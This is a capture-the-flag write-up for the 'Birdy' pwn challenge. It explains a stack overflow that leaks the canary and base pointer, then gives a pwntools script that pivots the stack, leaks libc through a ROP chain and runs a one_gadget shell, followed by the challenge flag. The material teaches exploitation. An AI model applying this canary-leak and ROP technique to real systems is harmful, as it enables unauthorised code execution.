# Birdy

——————— 𝘼𝙪𝙩𝙝𝙤𝙧 𝙣𝙤𝙩𝙚 ———————<br>
𝗖𝗵𝗮𝗹𝗹𝗲𝗻𝗴𝗲’𝘀 𝗻𝗮𝗺𝗲: Birdy.<br>
𝗖𝗮𝘁𝗲𝗴𝗼𝗿𝘆: Pwn.<br>
𝗗𝗲𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻: These cute little birds 🐦 are fluttering<br>
and pivoting around in stacks everywhere! Can you befriend them?<br>
Find more details using: https://gofile.io/d/BctXD4<br>
—————————————————————<br>
```
pwndbg> checksec
RELRO           STACK CANARY      NX            PIE   
Partial RELRO   Canary found      NX enabled    No PIE
```

## Playing with the binary

```
$ ./birdy
   \\
   (o>
\\_//)
 \_/_)
  _|_

A wild cute little birdy 🐦 appeared!

Quick! What do you name it? aaa
Birdy 🐦 likes his new name aaa
��?
How do you feel now? aaa
```
First thing, we notice is the leak printed after our input, after looking at the decompiled code<br>
we also notice that name_birdy() allocates 0x58 bytes as input buffer, but reads 0x68 bytes for the second input<br>
so we can overflow the buffer and overwrite the stack canary and rbp pointer, but we need to leak them first<br>
```C
void name_birdy(void)

{
  long in_FS_OFFSET;
  undefined local_68 [88];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Quick! What do you name it? ");
  readstr(local_68,0x58);
  printf(&DAT_00400d70,local_68);
  printf("How do you feel now? ");
  readstr(local_68,0x68);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}
```

## Leaking the stack

In order to leak the stack canary and base pointer, we need to send 0x59 bytes (0x58 + '\n') as input<br>
to overwrite the first null byte in the canary (otherwise printf will stop there, not leaking anything)<br>

```python
r.sendlineafter('Quick! What do you name it? ', 'a'*88)
r.recvline()
canary = u64(b'\0' + r.recv(7))
rbp = u64(r.recvline(keepends=False).ljust(8, b'\0'))

log.info('Leaking stack canary : ' + str(hex(canary)))
log.info('Leaking base pointer : ' + str(hex(rbp)))
```

## Stack pivoting

We leaked the canary and base pointer and we can't overwrite the return pointer of this function, but we can<br>
control the return pointer of it's caller by changing the base pointer to a memory address that we control<br>
so when the caller function reaches the 'ret' instruction, it will pop the address that we stored there.<br>
All that is left to do now is making a rop-chain to leak libc address, calculate one_gadget address and write<br>
it to memory by calling readstr() and executing a one gadget to get a shell!<br>

```python
def main():

    elfrop = ROP(elf)
    pop_rsi_popr15_ret = elfrop.find_gadget(["pop rsi", "pop r15", "ret"]).address
    pop_rdi_ret = elfrop.find_gadget(["pop rdi", "ret"]).address
    name_birdy = elf.sym.name_birdy

    r = conn()

    r.sendlineafter('Quick! What do you name it? ', 'a'*88)
    r.recvline()
    canary = u64(b'\0' + r.recv(7))
    rbp = u64(r.recvline(keepends=False).ljust(8, b'\0'))

    log.info('Leaking stack canary : ' + str(hex(canary)))
    log.info('Leaking base pointer : ' + str(hex(rbp)))

    payload = flat(canary, rbp-0x40, pop_rdi_ret, elf.got.puts, elf.plt.puts,
            pop_rdi_ret, rbp-0x38, pop_rsi_popr15_ret, 0x100, 0x0, elf.sym.readstr)
    payload = payload.ljust(0x58, b'\0')
    payload += p64(canary) + p64(rbp-0x88)

    r.send(payload)
    r.recvuntil('How do you feel now? ')
    libc.address = u64(r.recvline(keepends=False).ljust(8, b'\0')) - libc.sym.puts
    log.info('Leaking libc pointer : ' + str(hex(rbp)))
    one_gadget = libc.address + 0x4f432
    r.sendline(p64(one_gadget).ljust(0x100, b'\0'))

    r.interactive()
```

## Flag
```
shellmates{C4N4RIeS_4r3_N0w_Your_fR1ends}
```
